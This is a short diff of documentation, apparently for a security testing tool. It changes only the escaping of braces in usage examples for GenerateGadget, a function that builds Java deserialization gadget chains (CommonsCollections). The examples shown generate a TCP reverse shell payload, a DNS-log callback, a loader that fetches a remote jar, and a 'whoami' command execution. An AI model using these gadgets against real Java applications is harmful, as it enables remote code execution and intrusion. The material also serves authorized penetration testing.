@@ -1489,11 +1489,11 @@ GenerateGadget this is a highly flexible function that can generate a Java objec
  2. Generate a Java object that have one param and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param.
     Example: GenerateGadget("CommonsCollections2", "Sleep", "1000")
  3. Generate a Java object that have multiple params and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param map.
-    Example: GenerateGadget("CommonsCollections2", "TcpReverseShell", map[string]string{"host": "127.0.0.1","port":"8080"})
+    Example: GenerateGadget("CommonsCollections2", "TcpReverseShell", map[string]string&#123;"host": "127.0.0.1","port":"8080"&#125;)
  4. Generate a Java object that have one param and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param.
     Example: GenerateGadget("CommonsCollections1", "dnslog", "xxx.xx.com")
  5. Generate a Java object that have multiple params and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param map.
-    Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})
+    Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string&#123;"url": "xxx.com", "name": "exp"&#125;)
  6. Generate a Java object that implement by TemplateImpl.
     Example: GenerateGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))
 
